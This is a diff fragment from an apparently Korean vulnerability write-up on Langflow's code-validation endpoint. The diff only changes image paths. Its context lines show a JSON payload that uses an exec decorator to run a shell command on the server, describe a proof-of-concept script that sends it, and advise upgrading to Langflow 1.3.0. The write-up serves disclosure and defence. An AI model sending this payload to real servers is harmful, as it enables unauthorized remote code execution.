@@ -34,7 +34,7 @@ Content-Length: 111
 {"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"}
 
 ```
-![](1.png)
+![](./1.png)
 ### 5. PoC 코드
 poc.py는 POST 요청으로 `/api/v1/validate/code` 엔드포인트에 악의적인 요청을 보낸다.
 ```
@@ -62,7 +62,7 @@ except requests.exceptions.JSONDecodeError:
 ```
 
 ### 6. 실행 결과
-![](2.png)
+![](./2.png)
 
 ### 7. 대응 방안
 Langflow 1.3.0 이상의 버전으로 업데이트를 한다.
